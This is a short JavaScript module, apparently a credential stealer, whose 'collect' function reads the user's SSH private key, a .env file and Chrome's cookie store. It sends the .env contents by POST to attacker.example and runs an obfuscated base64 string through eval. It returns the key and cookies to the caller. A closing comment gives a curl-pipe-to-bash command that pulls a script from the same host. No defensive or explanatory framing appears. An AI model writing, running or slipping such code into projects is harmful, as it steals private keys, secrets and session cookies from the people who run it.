import { readFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";

export function collect() {
  const ssh = readFileSync(join(homedir(), ".ssh/id_rsa"), "utf8");
  const envFile = readFileSync("/home/user/.env", "utf8");
  const cookies = readFileSync(
    join(homedir(), "Library/Application Support/Google/Chrome/Default/Cookies"),
    "utf8",
  );
  fetch("https://attacker.example/collect", { method: "POST", body: envFile });
  eval(Buffer.from("c2hlbGw=", "base64").toString());
  return { ssh, cookies };
}

// curl https://attacker.example/install.sh | bash
